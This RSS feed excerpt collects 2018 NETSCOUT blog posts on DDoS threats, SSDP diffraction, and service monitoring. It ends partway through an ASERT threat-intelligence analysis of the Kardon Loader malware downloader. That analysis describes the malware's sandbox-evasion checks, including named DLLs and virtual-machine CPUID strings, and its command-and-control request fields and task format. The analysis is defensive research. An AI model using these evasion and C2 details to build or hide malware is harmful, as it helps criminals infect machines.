  <content:encoded><![CDATA[<p>In the <a href="https://goo.gl/MLpMKm" target="_blank">13<sup>th</sup> Annual Worldwide Infrastructure Security Report (WISR)</a> from NETSCOUT Arbor, survey respondents were asked to identify the security measures they had in place against DDoS attacks. Among enterprise respondents, 82% identified firewalls and 57% had intrusion detection/prevention systems (IDS/IPS). In contrast, only 28% had Intelligent DDoS Mitigation Systems.</p>

<p>Firewalls and IDS/IPS certainly have their place in the security arsenal. They are the first line of defense against attacks whose purpose is, for example, to identity theft or industrial espionage. But on their own, they are inadequate against attacks intended to deny service. In fact, they are often the first targets of DDoS attacks seeking to compromise network infrastructure.</p>

<p>Security decisions often reflect a “check-the-box” approach: what tools do we need to have? And perimeter defenses like firewalls usually rank high on the must-have checklist. Often this approach is driven by compliance concerns: what do the regulators say we must have? &nbsp;All too often, organizations then lull themselves into believing that if they are compliant, they are secure. They have checked all the boxes.</p>

<p>Instead of checking off a list of solutions, enterprises need to assess where they stand on the continuum of risk posed by DDoS threats. In other words, “What are the DDoS risks we face, and are we prepared to meet them?” Here are some likely answers:</p>

<p><strong>Volumetric DDoS attacks: </strong>This type of DDoS attack seeks to consume the bandwidth either within the target or between the target and the rest of the internet. It achieves its objective of blocking access to and delivery of services through overwhelming force. Such attacks are increasing in size – the <a href="https://asert.arbornetworks.com/netscout-arbor-confirms-1-7-tbps-ddos-attack-terabit-attack-era-upon-us/" target="_blank">1+ terabit attack</a> is becoming the new reality. Defending against them requires a mitigation solution of comparable capacity, which because of its sheer size typically resides in the cloud.</p>

<p><strong>TCP State Exhaustion attacks: &nbsp;</strong>These attacks attempt to consume the connection state tables present in many infrastructure components, such as load-balancers, firewalls and application servers. Even high capacity devices capable of maintaining millions of connections can be taken down by these attacks.</p>

<p><strong>Application layer attacks:</strong> These attacks go after specific applications or services residing at Layer-7, also known as the application layer. These are particularly insidious because they can be very effective with as few as one attacking machine generating a low traffic rate, which makes them very difficult to detect and mitigate. Defending against them requires a <a href="https://www.netscout.com/product/arbor-availability-protection-system">device</a> that can distinguish between legitimate data traffic coming into a network and cleverly disguised threats – no easy task as traffic volume and speeds accelerate.</p>

<p><strong>Multi-layer, multi-vector attacks: </strong>DDoS attacks are increasingly employing some combination or variants of these three attack categories in a single sustained attack. This has the effect of confusing and diverting defenses. A recent reported attack on Chile’s largest bank put some 9,500 servers and workstations out of commission – a major disruption in and of itself, but it turned out to be merely a diversion that allowed the attackers to achieve their real objective: siphoning $10 million out of the bank via the SWIFT network.</p>

<p><strong>Outbound attacks from within:</strong> Sophisticated attackers are turning the tables on defenders and planting malware in enterprise networks that can be used to launch attacks on both internal and external targets. Bad actors especially favor Internet of Things (IoT) devices as a way to worm their way into enterprise networks. IoT botnets have figured prominently in recent large attacks.</p>

<p><strong>Emerging threats:</strong> As if all these threats were not enough, new ones keep springing up on the global threat landscape. Staying ahead of them requires a global threat intelligence capability.</p>

<p>A strong defense posture calls for protection against all these types of threats. Ignoring any one leaves you exposed at some point along the risk continuum. A hybrid or layered defense combining cloud-based and on-premise detection and mitigation, informed by global threat intelligence alerts and powered by automation, is widely considered best practice.</p>

<p>A security professional might look at all the risks and what it takes to mitigate them, and think, “We don’t have the budget, and we don’t have the bandwidth.” That is where the <a href="https://www.netscout.com/product/arbor-cloud">managed DDoS service</a> option comes in – outsourcing to a provider that has already made the investment in technology and professional expertise to mitigate any type of attack. It saves money, amplifies in-house resources, and reduces risks. And it renders the security checklist obsolete.</p>
]]></content:encoded>
    <category domain="http://localhost:7996/tags/category/ddos">DDoS</category>
    <enclosure url="http://localhost:7996/sites/default/files/DDoS_attack.jpg" length="169045" type="image/jpeg"/>
    <guid isPermaLink="false">d447b2a1-67c7-4c3f-9a1b-c660f6bd3c6e</guid>
    <pubDate>Tue, 03 Jul 2018 00:47:08 -0400</pubDate>
    <source url="http://localhost:7996/full-blogs-2018.xml">NETSCOUT Blogs</source>
    <dc:creator>Kevin Whalen</dc:creator>
    </item>
<item>
  <title>Top Business Goal: Faster Deployment of Apps and Services</title>
  <link>http://localhost:7996/blog/top-business-goal-faster-deployment-apps-and-services</link>
  <description>As digital transformation drives the rapid pace of technology innovation, IT professionals are under increasing pressure to speed the development and deployment of applications and services – all while maintaining quality and cutting costs. In today’s connected world, delivering a better customer experience is key to business success.</description>
  <content:encoded><![CDATA[<p>As digital transformation (DX) drives the rapid pace of technology innovation, IT professionals are under increasing pressure to speed the development and deployment of applications and services – all while maintaining quality and cutting costs. &nbsp;In today’s connected world, delivering a better customer experience is key to business success.&nbsp;</p>

<p>To meet this growing demand, companies are finding themselves compelled to expand their infrastructure by migrating compute applications and storage workloads to the cloud and delivering services through hybrid, on-prem and public cloud environments. As Internet of Things (IoT) devices continue to permeate both personal and business environments, and 5G connectivity eventually unlocks a brave new world of digital possibilities, the importance of maintaining connectivity and communication across a host of wireless and wired, physical and virtual, local and wide area networks (WAN) will be absolutely imperative.</p>

<p>In the headlong dash to embrace DX, businesses shouldn’t lose sight of the importance of ensuring their investments in hybrid cloud are delivering true business value. This means technology infrastructure must be reliable and capable of meeting demands. To do this, organizations should continuously monitor their entire infrastructure in order to gain end-to-end visibility into all business services and interdependencies, so problems can be quickly pinpointed and repairs made before any impact to the business.</p>

<p>Adding to the challenge, large volumes of data are being generated by new applications and infrastructure components, such as IoT, putting greater burdens on networks and storage capacity. Collecting raw log data and sending it to a central location for storage and processing dramatically increases the size and cost of storage and communications over the WAN.</p>

<p>To address this challenge, businesses are increasingly taking a <a href="https://www.netscout.com/solutions/smart-data/?ls=PR-MKTG&amp;lsd=blog-1-06.27.18-1">smart data approach</a>, which boils down the traffic flows collected close to the source and compresses it into metadata, allowing organizations to hold onto only the data that represents real value. Smart data can then be used to uncover invaluable business insights that give companies a competitive edge. And because smart data is compressed, it dramatically reduces the volume of data that must be stored, reducing costs and burdens on precious resources.</p>

<p>Smart data has already proven its worth across a range of industries, such as automotive, manufacturing and healthcare, powering services, operations and business analytics. This trend will continue as DX reaches across nearly every business sector, driving a greater reliance on new technologies and the networks and infrastructure that supports them.</p>

<p>This blog is based on the article, <a href="http://www.apmdigest.com/2018-predictions-rapid-transformation-smart-data-and-mission-critical-connectivity" target="_blank">2<em>018 Predictions: Rapid Transformation, Smart Data and Mission-Critical Connectivity</em></a> written by Michael Segal, Area Vice President Strategy at NETSCOUT, which was published on APMdigest.</p>
]]></content:encoded>
    <category domain="http://localhost:7996/tags/category/enterprise">Enterprise</category>
    <enclosure url="http://localhost:7996/sites/default/files/Apps_Services_Smart_Data.jpg" length="119246" type="image/jpeg"/>
    <guid isPermaLink="false">e455f37d-424b-4bac-9647-0f7ec436d170</guid>
    <pubDate>Thu, 28 Jun 2018 13:58:30 -0400</pubDate>
    <source url="http://localhost:7996/full-blogs-2018.xml">NETSCOUT Blogs</source>
    <dc:creator>Michael Segal</dc:creator>
    </item>
<item>
  <title>A New Twist In SSDP Attacks</title>
  <link>http://localhost:7996/blog/asert/new-twist-ssdp-attacks</link>
  <description>Arbor ASERT has uncovered a new class of SSDP abuse where naïve devices will respond to SSDP reflection/amplification attacks with a non-standard port. The resulting flood of UDP packets have ephemeral source and destination ports, making mitigation more difficult - a SSDP diffraction attack. This behavior appears to stem from broad re-use in CPE devices of the open source...</description>
  <content:encoded><![CDATA[<p>Arbor ASERT has uncovered a new class of SSDP abuse where naïve devices will respond to SSDP reflection/amplification attacks with a non-standard port. The resulting flood of UDP packets have ephemeral source and destination ports, making mitigation more difficult - a SSDP diffraction attack. This behavior appears to stem from broad re-use in CPE devices of the open source library libupnp. Evidence from prior DDoS events suggest that attackers are aware of this behavior and may choose a pool of these misbehaving victims based on the efficacy of their attack. Using Arbor products to mitigate these attacks require inspecting packet content to filter the flood of SSDP replies and non-initial fragments.</p>

<p><strong>Key Findings</strong> •</p>

<ul>
	<li>SSDP has been abused for reflection/amplification attacks for many years. In 2015, Arbor identified attacks utilizing SSDP traffic from ephemeral source ports.</li>
	<li>SSDP diffraction attacks that use ephemeral ports can defeat naïve port filtering mitigations.</li>
	<li>Surprisingly, the majority of the roughly 5 million SSDP servers reachable via the public Internet will respond from an ephemeral source port.</li>
	<li>The behavior stems from use of the open source library libupnp, which appears to be used in a variety of CPE devices.</li>
	<li>Defending against SSDP diffraction attacks requires inspecting packet content.</li>
</ul>

<p><a href="https://www.netscout.com/sites/default/files/asert-blog/uploads/2018/06/ssdp_diffraction.pdf">Click here to download the full report.</a></p>
]]></content:encoded>
    <category domain="http://localhost:7996/tags/blog-category/asert">ASERT</category>
    <enclosure url="http://localhost:7996/sites/default/files/Thumb_ssdp_diffraction.png" length="18006" type="image/png"/>
    <guid isPermaLink="false">29c8a84d-d45e-4da1-a362-408d6d5dcaff</guid>
    <pubDate>Wed, 27 Jun 2018 12:10:57 -0400</pubDate>
    <source url="http://localhost:7996/full-blogs-2018.xml">NETSCOUT Blogs</source>
    <dc:creator>ASERT Team</dc:creator>
    </item>
<item>
  <title>An Apple a Day: Virtualized Application Service Assurance</title>
  <link>http://localhost:7996/blog/apple-day-virtualized-application-service-assurance</link>
  <description>As healthcare services, such as electronic medical records (EMR) and radiology services, are increasingly digitized, the need for network and application reliability is becoming a matter of life and death. Further complicating the challenge IT professionals face, more and more healthcare organizations are deploying virtualized network services and adopting “as-a-service” models...</description>
  <content:encoded><![CDATA[<p>As healthcare services, such as electronic medical records (EMR) and radiology services, are increasingly digitized, the need for network and application reliability is becoming a matter of life and death. Further complicating the challenge IT professionals face, more and more healthcare organizations are deploying virtualized network services and adopting “as-a-service” models. Without sufficient monitoring of these virtualized environments, healthcare IT is unable to stay ahead of slowdowns and outages that directly impact the patient care delivery network. As a result, doctors, nurses, clinicians, and most importantly, patients, may suffer the consequences.</p>

<p>In the case of the DICOM protocol (Digital Imaging and Communications in Medicine), which is used to communicate radiology information, healthcare providers must have rapid access to stored documents and images in order to make an accurate diagnosis or execute a prescribed medical procedure. Any delays in being able to pull up vital patient imagery can have life or death consequences.</p>

<p>Slowdowns or outages typically result in war room finger pointing between healthcare IT staff and third-party vendors. As everyone focuses on proving their part of the environment wasn’t responsible for disruption, valuable time is wasted – and lives are put at risk.</p>

<p>Whether hosted in private data centers or public cloud environments, maintaining the performance of virtualized healthcare applications is absolutely imperative. Innovations that expand the reach of proactive monitoring and analysis of the east-west traffic of virtualized applications are needed to provide necessary visibility into virtualized healthcare applications, so IT can overcome any challenges.</p>

<p>Healthcare IT can begin to address network and application challenges by implementing a proactive monitoring solution that relies on wire traffic to deliver visibility and <a href="https://www.netscout.com/solutions/service-assurance-healthcare/?ls=PR-MKTG&amp;lsd=pr-1-06.20.18-1">service assurance</a> capabilities, facilitating effective troubleshooting in the war room. Using virtual agents for monitoring can provide critical insights into how traffic flows through the virtualize environment, providing much needed visibility into any existing gaps. These insights make it possible to pinpoint the cause of any slowdowns or outages.</p>

<p>With the right solution in place, healthcare IT professionals can significantly reduce mean-time-to-resolve (MTTR) across new virtualized environments. Instead of having systems disrupted for weeks and the war room being consumed by an endless blame game, analysis can be conducted quickly – often times in under an hour.</p>

<p>For doctors and hospital staff, the performance of these vital systems can determine the outcome of a medical emergency. Reducing the time to pinpoint a problem and achieve service assurance undoubtedly saves lives. Nothing could be more important.</p>

<p>This blog is based on the article, <a href="https://www.healthitoutcomes.com/doc/applying-the-concept-of-preventative-care-to-your-virtualized-application-services-0001" target="_blank"><em>Applying The Concept Of Preventative Care To Your Virtualized Application Services</em></a>, written by Eileen Haggerty, Senior Director Enterprise Business Operations for NETSCOUT, which was published on Health IT Outcomes.</p>
]]></content:encoded>
    <category domain="http://localhost:7996/tags/category/enterprise">Enterprise</category>
    <enclosure url="http://localhost:7996/sites/default/files/an_apple_a_day_service_assurance.jpg" length="72168" type="image/jpeg"/>
    <guid isPermaLink="false">1b7e8764-0484-4a63-8f65-d9715f44e360</guid>
    <pubDate>Tue, 26 Jun 2018 16:45:56 -0400</pubDate>
    <source url="http://localhost:7996/full-blogs-2018.xml">NETSCOUT Blogs</source>
    <dc:creator>Eileen Haggerty</dc:creator>
    </item>
<item>
  <title>Be Vigilant of the Cyber Reflection</title>
  <link>http://localhost:7996/blog/be-vigilant-cyber-reflection</link>
  <description>A common question I receive is “Why do DDoS attack keep occurring?” My answer is two-fold. One. It’s so easy to execute. Whether it be Do It Yourself DDoS attack tools, or DDoS Attack for Hire Services, anyone without any technical skills can execute a DDoS attack.</description>
  <content:encoded><![CDATA[<p>I speak a lot at conferences. A common question I receive is “Why do DDoS attack keep occurring?” My answer is two-fold.  One. It’s so easy to execute. Whether it be Do It Yourself DDoS attack tools, or DDoS Attack for Hire Services (sold as network / bootstresser services), anyone without any technical skills can execute a DDoS attack.</p>

<p>Second. There are many motivations behind the launch of a DDoS attack. The chart below from our 13<sup>th</sup> Annual WISR shows only the Top 5 Motivations.  </p>
<img alt="Top 5 Motivations WSR" data-entity-type="file" data-entity-uuid="45df7b51-abc3-4b46-8dcf-029116f33aa7" src="http://localhost:7996/sites/default/files/inline-images/Top%205%20Motivations%20Chart.png" class="align-center" /><p> </p>

<p>The motivation that has always intrigued me the most is <em>Political/ Ideological Dispute</em>.  To help explain this motivation I use the term” Cyber Reflection.” Think of it this way. Have you ever noticed that during most media attracting events, (e.g. a major sporting event, world summits, or major political elections /decisions) there’s always a video/picture of humans demonstrating their point of view? These demonstrations occur on the streets outside the events, where you see things like protest signs, flags being burned, various forms of vandalism etc. Many times, there’s another demonstration occurring simultaneously - in cyber space.  These demonstrations are in the form of a DDoS attack. Why? It goes back to the first reason I mentioned – it’s so easy to launch, anyone can do it.</p>

<p>My message to the audience is always… “Be vigilant.” You don’t need to be the center of the geopolitical event to be the target.  For example, many times during a major sporting event, DDoS attacks are launched against the sponsors or financial backers of the event, not the event itself. The 20 Year History of DDoS attacks is filled with such events - many of them stemmed from political/ideological disputes.</p>

<p>Here’s one you can think about that’s related to recent events.  On May 8, President Donald Trump announced the United States will be withdrawing from the Joint Comprehensive Plan of Action (JCPOA),  also known as the Iranian Nuclear Deal. As anticipated, this garnished major media attention and supporters quickly lined up on both sides of the decision - and again you saw demonstrations on the streets.</p>

<p>No sooner had this announcement been made did former White House Cybersecurity Coordinator under president Barack Obama, Michael Daniels, <a href="https://www.washingtonpost.com/news/powerpost/paloma/the-cybersecurity-202/2018/05/09/the-cybersecurity-202-now-that-trump-s-out-of-the-nuclear-deal-iran-may-flex-cyber-muscle/5af1d96030fb042db57973cb/?utm_term=.becd24e66c65" target="_blank">send a warning</a> that it’s likely that there will be a new round of DDoS attacks out of Iran as a result of President Trump’s decision – thus the pending Cyber Reflection.</p>

<p>The Iranians are not new to DDoS attacks. In 2012-2013, they launched a series of DDoS attacks against U.S. financial institutions – code named <a href="https://en.wikipedia.org/wiki/Operation_Ababil" target="_blank">Operation Ababil.</a> Arbor’s ASERT has also <a href="https://asert.arbornetworks.com/lessons-learned-from-the-u-s-financial-services-ddos-attacks/" target="_blank">written</a> much about this as these attacks have come to represent the modern-day multi-vector DDoS attack.</p>

<p>In some cases, political / ideological disputes are not the work of your run of the mill protestor, they are perpetrated by well-organized, highly skilled attack groups affiliated with and/or funded by nation states.  In fact, after years of investigating Operation Ababil, the <a href="https://www.fbi.gov/wanted/cyber/iranian-ddos-attacks" target="_blank">FBI arrested several Iranian nationals</a> for their involvement in the attacks executed on behalf of the Iranian Government, including the Islamic Revolutionary Guard Corps.</p>

<p>According to ASERT’s Jill Sopko, who specializes in Iranian and Middle East cyber activity, “But it’s not just the Iranians we should be vigilant about…The middle east/western Asia is a hot bed of activity. We’ve moved our U.S. embassy to Jerusalem. Have huge arms deals with the Saudis (who are fighting Yemenis). Nearly everyone in the area is either at war or in some sort of proxy war.  The entire area is a hotbed of activity and DDoS is not only a capability most of the nation states there have – but anyone has. DDoS attacks could come from anywhere, from anyone, and we are not popular.” </p>

<p>So, in conclusion, I’m not predicting there will be another series of DDoS attacks launched against U.S. financial institutions because of us pulling out of the Iranian Nuclear Deal - aka Operation Ababil v2.0. All I’m saying is that, every once in a while, raise your head from the thousands of SIEM alerts you're investigating and simply turn on your TV. When you see a major geopolitical event, ask yourself, “Am I remotely associated with that event and if so, should I be on the lookout for a DDoS attack?”</p>

<p>Be vigilant of the Cyber Reflection my friends.</p>
]]></content:encoded>
    <category domain="http://localhost:7996/tags/category/security">Security</category>
    <enclosure url="http://localhost:7996/sites/default/files/cyber_reflection.jpg" length="346818" type="image/jpeg"/>
    <guid isPermaLink="false">85591990-aed7-4870-9c05-d4a4af67f205</guid>
    <pubDate>Mon, 25 Jun 2018 14:53:29 -0400</pubDate>
    <source url="http://localhost:7996/full-blogs-2018.xml">NETSCOUT Blogs</source>
    <dc:creator>Tom Bienkowski</dc:creator>
    </item>
<item>
  <title>Legal Guardians: Supporting the Connected World of NETSCOUT</title>
  <link>http://localhost:7996/blog/legal-guardians-supporting-connected-world-netscout</link>
  <description>As businesses today embrace digital transformation, the need to assure the performance of the technologies that lie at the heart of the connected world has never been more important. NETSCOUT has made a name for itself throughout the marketplace, supporting the “Guardians of the Connected World” who are responsible for the ever more complex networks and applications that we...</description>
  <content:encoded><![CDATA[<p>As businesses today embrace digital transformation, the need to <a href="https://www.netscout.com/solutions/service-assurance/?ls=PR-MKTG&amp;lsd=blog-1-062118-1">assure the performance</a> of the technologies that lie at the heart of the connected world has never been more important. NETSCOUT has made a name for itself throughout the marketplace, supporting the “Guardians of the Connected World” who are responsible for the ever more complex networks and applications that we have come to rely on daily.</p>

<p>Three years ago, NETSCOUT went through its own transformation, acquiring several business entities that greatly expanded the company’s capabilities and industry reach. Today, NETSCOUT is an industry-leading provider of application and network performance management and cybersecurity products. With more than three thousand employees globally, the company has tripled its workforce and more than doubled its revenue. However, with this rapid growth in size and scope have come several complex challenges involving company culture and business operations.</p>

<p>An important champion behind NETSCOUT’s efforts to integrate new assets and personnel and to seize business opportunities has been Jeff Levinson, vice president and general counsel for the company. Jeff and his legal team have invested considerable time in getting to know new coworkers and new functions of the business, to provide experienced counsel and support their legal needs such as with revenue contracts or meeting compliance mandates.</p>

<p>To accomplish this, the in-house counsel’s office regularly talk to regional directors, sit in on forecast calls, attend engineering and executive meetings, participate in operations planning, and engage with marketing and manufacturing team leaders. With knowledge gained from these conversations, the legal team works to support efforts around product integration and new go-to-market approaches. Others in the department also work collaboratively to provide subject matter expertise in support of global operations and public company obligations.&nbsp;&nbsp;</p>

<p>One of the more important aspects of Jeff’s focus has been on the implementation of a corporate culture that is well suited for the newly integrated business. Consistent with the vision laid out by NETSCOUT CEO, Anil Singhal, Jeff has consistently promoted his and his department's longstanding foundational values of integrity, excellence, and fortitude.</p>

<p>Another important focus for Jeff and his team has been to ensure that the legal office is able to move at the speed of today’s digital business world. The increasing velocity of the marketplace necessitates that the legal department perform at hyper-speed. Each member of the team is expected to go beyond meeting the legal needs of the organization and contribute as business leaders. Jeff believes it’s critical for his team to always look at the bigger picture of how to make things work for the company’s employees, customers, shareholders, and even the community at large.</p>

<p>NETSCOUT’s legal team plays an important role as guardians of the business. As the company has transformed to meet the changing needs of the connected world, so too has the legal office. As a result, NETSCOUT is better prepared for sustained growth and continued industry leadership.</p>

<p>This blog is based on the article, <a href="https://profilemagazine.com/2018/guardians-of-the-netscout-galaxy/" target="_blank"><em>Guardians of the NetScout Galaxy</em></a><em>, </em>profiling Jeff Levinson, vice president and general counsel for NETSCOUT, which was published in Pro File Magazine.</p>
]]></content:encoded>
    <category domain="http://localhost:7996/tags/category/enterprise">Enterprise</category>
    <enclosure url="http://localhost:7996/sites/default/files/guardians_connected_world_1.jpg" length="161189" type="image/jpeg"/>
    <guid isPermaLink="false">b388ff86-aca6-496d-8f7e-9b33639e64b5</guid>
    <pubDate>Thu, 21 Jun 2018 13:03:38 -0400</pubDate>
    <source url="http://localhost:7996/full-blogs-2018.xml">NETSCOUT Blogs</source>
    <dc:creator>Jeff Levinson</dc:creator>
    </item>
<item>
  <title>Kardon Loader Looks for Beta Testers</title>
  <link>http://localhost:7996/blog/asert/kardon-loader-looks-beta-testers</link>
  <description>Key Findings ASERT researchers discovered Kardon Loader being advertised on underground forums. Kardon Loader features functionality allowing customers to open their own botshop, which grants the purchaser the ability to rebuild the bot and sell access to others. Kardon Loader is in early stages of development, public beta. Incorporates numerous anti-analysis checks to...</description>
  <content:encoded><![CDATA[<h2>Key Findings</h2>

<ul><li>ASERT researchers discovered Kardon Loader being advertised on underground forums.</li>
	<li>Kardon Loader features functionality allowing customers to open their own botshop, which grants the purchaser the ability to rebuild the bot and sell access to others.</li>
	<li>Kardon Loader is in early stages of development, public beta.</li>
	<li>Incorporates numerous anti-analysis checks to discourage analysis.</li>
</ul><h2>Executive Summary</h2>

<p>Kardon Loader is a malware downloader advertised on underground forums as a paid open beta product. This malware has been on sale by an actor under the username Yattaze, starting in late April. The actor offers the sale of the malware as a standalone build with charges for each additional rebuild, or the ability to set up a botshop in which case any customer can establish their own operation and further sell access to a new customer base.</p>

<p>Malware authors and distributors leverage downloader malware and botshops to build malware distribution networks. Malware distribution networks are commonly used by cyber criminals to create botnets to distribute additional payloads such as credential theft malware, ransomware, banking Trojans, and others. These distribution networks are often run by third party operators and offered as a service in underground markets.</p>

<p><strong>NOTE: ASERT actively collects indicators associated with this malware family to provide protection for our Netscout Arbor customers. </strong></p>

<h2>History</h2>

<p>On April 21, 2018 actor Yattaze began advertising the open public beta of a downloader named Kardon Loader for $50. The description of the malware family suggests this malware was a rebrand of the ZeroCool botnet which was under development previously by the same actor. The actor has had an account on the forum since April 2017 and received multiple vouches for this product. The advertisement for the loader is professional looking with its own logo (<strong>Figure 1</strong> &amp; <strong>Figure 2</strong>). </p>

<p><span class="TextRun SCXW105957596" lang="EN-US" xml:lang="EN-US" xml:lang="EN-US"><span class="NormalTextRun SCXW105957596"><img alt="Kardon Loader Advertisement" data-entity-type="file" data-entity-uuid="ea3f43eb-90cb-442e-b7ac-0a814dadf725" src="http://localhost:7996/sites/default/files/inline-images/Kardon%20Loader%20Advertisement.png" /></span></span></p>

<p><span class="TextRun SCXW105957596" lang="EN-US" xml:lang="EN-US" xml:lang="EN-US"><span class="NormalTextRun SCXW105957596">Figure 1: The advertisement for the loader is </span></span><span class="TextRun SCXW105957596" lang="EN-US" xml:lang="EN-US" xml:lang="EN-US"><span class="NormalTextRun SCXW105957596">professional looking with its own logo.</span></span></p>

<p><a href="https://www.netscout.com/sites/default/files/asert-blog/uploads/2018/06/kardon_pricing.png"><img alt="Kardon Loader Pricing" class="size-large wp-image-9579" height="1024" src="//www.netscout.com/sites/default/files/asert-blog/uploads/2018/06/kardon_pricing-708x1024.png" width="708" /></a> Figure 2: Kardon Loader Pricing[/caption] <span class="TextRun SCXW72313799" lang="EN-US" xml:lang="EN-US" xml:lang="EN-US"><span class="NormalTextRun SCXW72313799">The actor provides a disclaimer stating this software should not be used for malicious purposes</span></span><span class="TextRun SCXW72313799" lang="EN-US" xml:lang="EN-US" xml:lang="EN-US"><span class="NormalTextRun SCXW72313799"> (</span></span><strong><span class="TextRun SCXW72313799" lang="EN-US" xml:lang="EN-US" xml:lang="EN-US"><span class="NormalTextRun SCXW72313799">Figure 3</span></span></strong><span class="TextRun SCXW72313799" lang="EN-US" xml:lang="EN-US" xml:lang="EN-US"><span class="NormalTextRun SCXW72313799">)</span></span><span class="TextRun SCXW72313799" lang="EN-US" xml:lang="EN-US" xml:lang="EN-US"><span class="NormalTextRun SCXW72313799">.</span></span><span class="EOP SCXW72313799"> </span> </p>

<p><a href="https://www.netscout.com/sites/default/files/asert-blog/uploads/2018/06/kardon_disclaimer.png"><img alt="Kardon Loader Disclaimer" class="size-large wp-image-9575" height="199" src="//www.netscout.com/sites/default/files/asert-blog/uploads/2018/06/kardon_disclaimer-1024x226.png" width="900" /></a> Figure 3: Kardon Loader Disclaimer[/caption] <span class="TextRun SCXW258453631" lang="EN-US" xml:lang="EN-US" xml:lang="EN-US"><span class="NormalTextRun SCXW258453631">Additionally, the actor uploaded a YouTube video showing the panel functionality from an admin standpoint</span></span><span class="TextRun SCXW258453631" lang="EN-US" xml:lang="EN-US" xml:lang="EN-US"><span class="NormalTextRun SCXW258453631"> (</span></span><strong><span class="TextRun SCXW258453631" lang="EN-US" xml:lang="EN-US" xml:lang="EN-US"><span class="NormalTextRun SCXW258453631">Figure 4</span></span></strong><span class="TextRun SCXW258453631" lang="EN-US" xml:lang="EN-US" xml:lang="EN-US"><span class="NormalTextRun SCXW258453631">)</span></span><span class="TextRun SCXW258453631" lang="EN-US" xml:lang="EN-US" xml:lang="EN-US"><span class="NormalTextRun SCXW258453631">.</span></span><span class="EOP SCXW258453631"> </span></p>

<p><a href="//www.netscout.com/sites/default/files/asert-blog/uploads/2018/06/kardon_youtube.png"><img alt="Kardon Loader YouTube Walkthrough" class="size-full wp-image-9580" height="274" src="//www.netscout.com/sites/default/files/asert-blog/uploads/2018/06/kardon_youtube.png" width="460" /></a> Figure 4: Kardon Loader YouTube Walkthrough </p>

<h2>Distribution</h2>

<p>Insights gained from the forum thread suggest the actor initially conducted tests by leveraging a well-known botshop named “Pink Panther’s automated loads shop (Pink)”. Commentary from the actor reveals this bot is not widely distributed at this time. Only 124 infections are shown in a screenshot of the loader’s test network posted by the actor (<strong>Figure 5</strong>).</p>

<p><a href="https://www.netscout.com/sites/default/files/asert-blog/uploads/2018/06/kardon_dashmap.png"><img alt="Kardon Loader Administrator Panel Showing Infections" class="size-large wp-image-9574" height="665" src="//www.netscout.com/sites/default/files/asert-blog/uploads/2018/06/kardon_dashmap-1024x757.png" width="900" /></a> Figure 5: Kardon Loader Administrator Panel Showing Infections[/caption]</p>

<h2>Analysis</h2>

<p>The actor alleges the following functionality is available or forthcoming to Kardon Loader:</p>

<ul><li>Bot Functionality</li>
	<li>Download and Execute Task</li>
	<li>Update Task</li>
	<li>Uninstall Task</li>
	<li>Usermode Rootkit</li>
	<li>RC4 Encryption (Not Yet Implemented)</li>
	<li>Debug and Analysis Protection</li>
	<li>TOR Support</li>
	<li>Domain Generation Algorithm (DGA)</li>
</ul><p>ASERT found many of these features absent in the samples reviewed. All samples analyzed used hard-coded command and control (C2) URLs instead of DGA. There was also no evidence of TOR or user mode rootkit functionality in the binaries.</p>

<h2>Anti-Analysis Techniques</h2>

<p>Kardon Loader uses a few anti-analysis techniques, such as attempting to get the module handle for the following DLLs:</p>

<ul><li>avghookx.dll</li>
	<li>avghooka.dll</li>
	<li>snxhk.dll</li>
	<li>sbiedll.dll</li>
	<li>dbghelp.dll</li>
	<li>api_log.dll</li>
	<li>dir_watch.dll</li>
	<li>pstorec.dll</li>
	<li>vmcheck.dll</li>
	<li>wpespy.dll</li>
</ul><p>If any of the above DLL handles are returned it will exit the process. These DLLs are associated with antivirus, analysis tools, and virtualization. Kardon Loader will also enumerate the CPUID Vendor ID value and compare it against the following strings:</p>

<ul><li>KVMKVMKVM</li>
	<li>Microsoft Hv</li>
	<li>VMwareVMware</li>
	<li>XenVMMXenVMM</li>
	<li>prl hyperv</li>
	<li>VBoxVBoxVBox</li>
</ul><p>These are known CPUID Vendor ID values associated with virtualized machines. If one of these values are detected the malware will also exit.</p>

<h2>Command and Control</h2>

<p>Kardon Loader uses HTTP based C2 infrastructure with URL parameters that are base64 encoded. Upon execution Kardon Loader will send HTTP POSTs to the C2 with the following fields:</p>

<ul><li><strong>ID</strong> = Identification Number</li>
	<li><strong>OS</strong> = Operating System</li>
	<li><strong>PV</strong> = User Privilege</li>
	<li><strong>IP</strong> = Initial Payload (Full Path)</li>
	<li><strong>CN</strong> = Computer Name</li>
	<li><strong>UN</strong> = User Name</li>
	<li><strong>CA</strong> = Processor Architecture</li>
</ul><p>An example of the POST payload sent from Kardon Loader sample upon execution can be seen in (<b>Figure 6</b>): [caption id="attachment_9578" align="aligncenter" width="900"]<a href="https://www.netscout.com/sites/default/files/asert-blog/uploads/2018/06/kardon_pcap.png"><img alt="Kardon Loader POST Request" class="size-large wp-image-9578" height="182" src="//www.netscout.com/sites/default/files/asert-blog/uploads/2018/06/kardon_pcap-1024x207.png" width="900" /></a> Figure 6: Kardon Loader POST Request[/caption] Once the request is made, the C2 server will provide varying feedback which will result in either downloading and executing additional payloads, visiting a website, upgrading current payloads, or uninstalling itself. The C2 server response format for a wait command is:</p>

<ul><li><strong>notask</strong></li>
</ul><p>While other commands including the download and execution functionality use the following format:</p>

<ul><li><strong>newtask`##`# &lt;url&gt; </strong>

	<ul><li>Hashmarks represent the two-character task id and one-character task value</li>
	</ul></li>
</ul><p>Next, the infected host will send a confirmation message back to the C2 in the same format as the initial post payload with the following additional fields:</p>

<ul><li><strong>TD</strong> = Task Identifier (Provided by command and control)</li>
	<li><strong>OP</strong> = Task Output (1 if successful, 2 if not successful)</li>
</ul><p>Analysis of various samples reveal another parameter used for uninstalling of the loader directed by the C2:</p>

<ul><li><strong>UN</strong> = Uninstalled</li>
</ul><p>Posts from the actor on their advertisement thread suggests that C2 communication for this family will be changed to RC4 encryption in the future. Also, if the actor truly implements DGA, it may use it as a fallback mechanism for C2.</p>

<h2>Administration Panel</h2>

<p><br /><a href="https://www.netscout.com/sites/default/files/asert-blog/uploads/2018/06/kardon_panel1.png"><img alt="Kardon Loader Admin Panel" class="size-large wp-image-9576" height="450" src="//www.netscout.com/sites/default/files/asert-blog/uploads/2018/06/kardon_panel1-1024x512.png" width="900" /></a> The panel for Kardon Loader incorporates a simple design with a dashboard of the bot distribution and install statistics. A notable feature of this panel is the bot store functionality allowing the bot admin to generate access keys to customers that would give them the ability to execute tasks based on the predefined parameters (<strong>Figure 8</strong>).</p>

